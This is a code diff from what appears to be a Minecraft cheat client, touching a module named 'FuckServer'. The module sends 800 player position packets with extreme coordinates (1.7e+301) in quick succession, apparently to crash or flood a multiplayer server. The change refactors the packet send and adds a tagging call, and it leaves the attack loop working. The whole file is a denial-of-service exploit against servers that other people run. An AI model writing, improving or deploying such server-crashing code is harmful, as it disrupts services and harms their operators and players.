@@ -1,5 +1,6 @@
 package gq.yozakura.module.world;
 
+import gq.yozakura.bridge.PacketBridgeSupport;
 import gq.yozakura.manager.ModuleManager;
 import gq.yozakura.core.Client;
 import gq.yozakura.module.ModuleType;
@@ -28,7 +29,9 @@ public class FuckServer extends Module {
         public void run(){
             int i = 0;
             while (i < 800) {
-                Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(1.7e+301,-999.0,0.0,true));
+                C03PacketPlayer packet = new C03PacketPlayer.C04PacketPlayerPosition(1.7e+301, -999.0, 0.0, true);
+                PacketBridgeSupport.markNonCanonicalPlayerPacket(packet);
+                Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(packet);
                 i = i + 1;
                 try {
                     Thread.sleep(10);
